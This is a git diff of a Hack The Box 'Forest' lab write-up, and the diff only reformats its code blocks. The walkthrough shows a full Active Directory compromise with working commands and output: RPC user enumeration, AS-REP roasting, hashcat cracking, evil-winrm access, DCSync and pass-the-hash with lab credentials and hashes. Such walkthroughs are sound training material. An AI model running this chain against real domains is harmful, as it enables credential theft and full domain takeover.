@@ -65,8 +65,8 @@ import { TerminalReplay } from "@/components/cyber/TerminalReplay";
 
 ### Nmap Scan
 
-<pre><code className="language-bash">
-<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> nmap -sC -sV -p- -T4 -Pn 10.129.95.210 -oN scans/nmap-full.txt
+```bash
+asbawy@kali:~$ nmap -sC -sV -p- -T4 -Pn 10.129.95.210 -oN scans/nmap-full.txt
 PORT      STATE SERVICE      VERSION
 53/tcp    open  domain       Simple DNS Plus
 88/tcp    open  kerberos-sec Microsoft Windows Kerberos
@@ -81,7 +81,7 @@ PORT      STATE SERVICE      VERSION
 3269/tcp  open  tcpwrapped
 5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (WinRM)
 9389/tcp  open  mc-nmf       .NET Message Framing
-</code></pre>
+```
 
 <Callout type="info">
   **Key Observation:** This is a Windows Server 2016 Domain Controller (hostname: FOREST, domain: htb.local). WinRM on port 5985 is open — this will be our foothold and lateral movement channel.
@@ -91,8 +91,8 @@ PORT      STATE SERVICE      VERSION
 
 Since this is a Domain Controller, we can enumerate domain users anonymously via RPC:
 
-<pre><code className="language-bash">
-<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> rpcclient -U "" -N 10.129.95.210 -c "enumdomusers"
+```bash
+asbawy@kali:~$ rpcclient -U "" -N 10.129.95.210 -c "enumdomusers"
 user:[Administrator] rid:[0x1f4]
 user:[Guest] rid:[0x1f5]
 user:[krbtgt] rid:[0x1f6]
@@ -102,7 +102,7 @@ user:[svc-alfresco] rid:[0x47b]
 user:[andy] rid:[0x47e]
 user:[mark] rid:[0x47f]
 user:[santi] rid:[0x480]
-</code></pre>
+```
 
 <Callout type="warning">
   **Target Identified:** `svc-alfresco` is a service account — prime candidate for Kerberos attacks. Also note the Exchange-related infrastructure hints (Exchange Windows Permissions groups exist in the domain).
@@ -114,20 +114,20 @@ user:[santi] rid:[0x480]
 
 `svc-alfresco` has Kerberos pre-authentication disabled (`UF_DONT_REQUIRE_PREAUTH`). This means anyone can request an AS-REP for this account and crack the encrypted timestamp offline:
 
-<pre><code className="language-bash">
-<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> impacket-GetNPUsers 'htb.local/' -request -dc-ip 10.129.95.210 -format hashcat -outputfile loot/hashes.asreproast
+```bash
+asbawy@kali:~$ impacket-GetNPUsers 'htb.local/' -request -dc-ip 10.129.95.210 -format hashcat -outputfile loot/hashes.asreproast
 Name          MemberOf                                                UAC
 ------------  ------------------------------------------------------  --------
 svc-alfresco  CN=Service Accounts,OU=Security Groups,DC=htb,DC=local  0x410200
 
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:82e594b127490167...[truncated]
-</code></pre>
+```
 
 ### Cracking the Hash
 
-<pre><code className="language-bash">
-<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> hashcat -m 18200 loot/hashes.asreproast /usr/share/wordlists/rockyou.txt --force -O
-</code></pre>
+```bash
+asbawy@kali:~$ hashcat -m 18200 loot/hashes.asreproast /usr/share/wordlists/rockyou.txt --force -O
+```
 
 ```text
 $krb5asrep$23$svc-alfresco@HTB.LOCAL:...:s3rvice
@@ -135,16 +135,16 @@ $krb5asrep$23$svc-alfresco@HTB.LOCAL:...:s3rvice
 
 ### Verify Credentials
 
-<pre><code className="language-bash">
-<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> crackmapexec winrm 10.129.95.210 -u svc-alfresco -p 's3rvice'
+```bash
+asbawy@kali:~$ crackmapexec winrm 10.129.95.210 -u svc-alfresco -p 's3rvice'
 WINRM  10.129.95.210 5985  FOREST  [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
-</code></pre>
+```
 
 ### Foothold — Evil-WinRM
 
-<pre><code className="language-bash">
-<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> evil-winrm -i 10.129.95.210 -u svc-alfresco -p 's3rvice'
-</code></pre>
+```bash
+asbawy@kali:~$ evil-winrm -i 10.129.95.210 -u svc-alfresco -p 's3rvice'
+```
 
 ```powershell
 whoami
@@ -165,8 +165,8 @@ This is where we pivot from manual enumeration to automated AD attack path analy
 
 ### Collection
 
-<pre><code className="language-bash">
-<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> pharaohound collect \
+```bash
+asbawy@kali:~$ pharaohound collect \
 -t 10.129.95.210 \
   -u svc-alfresco \
   -p 's3rvice' \
@@ -175,7 +175,7 @@ This is where we pivot from manual enumeration to automated AD attack path analy
   --no-zip \
   -o pha-collect/ \
   --timeout 30
-</code></pre>
+```
 
 **Output:**
 ```
@@ -211,9 +211,9 @@ This is where we pivot from manual enumeration to automated AD attack path analy
 
 ### Analysis
 
-<pre><code className="language-bash">
-<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> pharaohound pha-collect/ -o pharaohound-report/ --format both --all --no-color
-</code></pre>
+```bash
+asbawy@kali:~$ pharaohound pha-collect/ -o pharaohound-report/ --format both --all --no-color
+```
 
 **Key findings from the 30 analyzers:**
 
@@ -334,9 +334,9 @@ Granting rights GUID '89e95b76-444d-4c62-991a-0facbeda640c' (Get-Changes-Filtere
 
 ### Step 6: DCSync Attack
 
-<pre><code className="language-bash">
-<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> impacket-secretsdump 'htb.local/pharaoh:Ph43a0h!@10.129.95.210' -just-dc-user administrator
-</code></pre>
+```bash
+asbawy@kali:~$ impacket-secretsdump 'htb.local/pharaoh:Ph43a0h!@10.129.95.210' -just-dc-user administrator
+```
 
 ```
 htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::
@@ -344,9 +344,9 @@ htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d
 
 ### Step 7: Pass-the-Hash as Administrator
 
-<pre><code className="language-bash">
-<span style={{ color: '#8b0000' }}>asbawy@kali:~$</span> evil-winrm -i 10.129.95.210 -u administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
-</code></pre>
+```bash
+asbawy@kali:~$ evil-winrm -i 10.129.95.210 -u administrator -H '32693b11e6aa90eb43d32c72a07ceea6'
+```
 
 ```powershell
 whoami
